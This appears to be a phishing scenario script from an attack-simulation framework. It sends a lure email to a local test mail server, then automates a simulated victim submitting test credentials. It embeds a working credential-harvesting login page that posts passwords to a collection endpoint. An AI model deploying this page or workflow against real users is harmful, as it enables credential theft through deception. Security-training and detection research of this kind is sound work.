#!/usr/bin/env python3
"""
钓鱼攻击脚本 - 实现真实的钓鱼邮件攻击
"""

import time
import requests
import subprocess
import logging
import json
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from logger_utils import log_attack_event
from scenarios.phishing.labels import deliver, exploit, credential_theft, email_opened, link_clicked, form_submitted, c2_communication

# 配置日志
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_phishing_page():
    """创建钓鱼页面HTML"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>账户验证 - 请登录</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
            input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
            button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-form">
            <h2>账户验证</h2>
            <p>为了确保您的账户安全，请重新验证您的登录信息：</p>
            <form id="loginForm">
                <input type="text" id="username" placeholder="用户名/邮箱" required>
                <input type="password" id="password" placeholder="密码" required>
                <button type="submit">验证账户</button>
            </form>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;
                
                // 发送凭证到收集服务器
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                }).then(response => response.json())
                .then(data => {
                    alert('验证成功！您的账户已安全。');
                });
            });
        </script>
    </body>
    </html>
    """

def setup_browser(params):
    """设置浏览器"""
    options = Options()
    if params.get("browser", {}).get("headless", True):
        options.add_argument("--headless")
    
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"--user-agent={params.get('browser', {}).get('user_agent', 'Mozilla/5.0')}")
    
    driver = webdriver.Firefox(options=options)
    driver.set_page_load_timeout(params.get("browser", {}).get("timeout", 30))
    
    return driver

def send_phishing_email(params):
    """发送钓鱼邮件"""
    try:
        # 使用curl发送邮件到MailHog
        email_data = {
            "from": params["phishing_email"]["sender"],
            "to": ["victim@company.com"],
            "subject": params["phishing_email"]["subject"],
            "body": params["phishing_email"]["body"] + f"\n\n点击链接: {params['target_link']}"
        }
        
        # 发送邮件
        response = requests.post(
            f"{params['mail_server']['web_ui']}/api/v1/messages",
            json=email_data,
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info("钓鱼邮件发送成功")
            log_attack_event("phishing_email_sent", {
                "subject": email_data["subject"],
                "target": email_data["to"][0]
            })
            return True
        else:
            logger.error(f"发送邮件失败: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"发送钓鱼邮件时出错: {e}")
        return False

def simulate_email_opening(params):
    """模拟邮件打开"""
    try:
        # 访问MailHog Web UI查看邮件
        mail_ui_url = params["mail_server"]["web_ui"]
        logger.info(f"访问邮件界面: {mail_ui_url}")
        
        response = requests.get(mail_ui_url, timeout=10)
        if response.status_code == 200:
            logger.info("成功访问邮件界面")
            email_opened()
            return True
        else:
            logger.error(f"访问邮件界面失败: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"模拟邮件打开时出错: {e}")
        return False

def run(params):
    """
    执行钓鱼攻击
    
    Args:
        params: 场景参数字典
    """
    logger.info("开始执行钓鱼攻击...")
    deliver()
    
    try:
        # 1. 发送钓鱼邮件
        logger.info("步骤1: 发送钓鱼邮件")
        if not send_phishing_email(params):
            logger.error("发送钓鱼邮件失败")
            return
        
        # 2. 模拟邮件打开
        logger.info("步骤2: 模拟邮件打开")
        if not simulate_email_opening(params):
            logger.error("模拟邮件打开失败")
            return
        
        # 3. 启动凭证收集服务器（如果还没有运行）
        logger.info("步骤3: 确保凭证收集服务器运行")
        
        # 4. 使用浏览器自动化点击钓鱼链接
        logger.info("步骤4: 浏览器自动化点击钓鱼链接")
        exploit()
        
        driver = None
        try:
            driver = setup_browser(params)
            
            # 访问钓鱼页面
            target_url = params["target_link"]
            logger.info(f"访问钓鱼页面: {target_url}")
            driver.get(target_url)
            
            link_clicked()
            log_attack_event("phishing_page_accessed", {"url": target_url})
            
            # 等待页面加载
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "loginForm"))
            )
            
            # 填写表单
            logger.info("填写钓鱼表单...")
            username_field = driver.find_element(By.ID, "username")
            password_field = driver.find_element(By.ID, "password")
            
            # 模拟用户输入
            username_field.send_keys("test_user@company.com")
            time.sleep(1)
            password_field.send_keys("test_password123")
            time.sleep(1)
            
            # 提交表单
            logger.info("提交钓鱼表单...")
            submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_button.click()
            
            form_submitted()
            credential_theft()
            
            # 等待提交完成
            time.sleep(3)
            
            # 验证凭证是否被收集
            logger.info("验证凭证收集...")
            try:
                response = requests.get(f"{params['capture_endpoint'].replace('/collect', '/credentials')}", timeout=10)
                if response.status_code == 200:
                    credentials = response.json()
                    logger.info(f"成功收集到 {credentials.get('count', 0)} 条凭证")
                    c2_communication()
                    log_attack_event("credentials_collected", {
                        "count": credentials.get('count', 0),
                        "credentials": credentials.get('credentials', [])
                    })
                else:
                    logger.warning("无法验证凭证收集状态")
            except Exception as e:
                logger.warning(f"验证凭证收集时出错: {e}")
            
        finally:
            if driver:
                driver.quit()
        
        logger.info("钓鱼攻击执行完成")
        log_attack_event("phishing_attack_complete")
        
    except Exception as e:
        logger.error(f"钓鱼攻击执行失败: {e}")
        log_attack_event("phishing_attack_failed", {"error": str(e)})
        raise
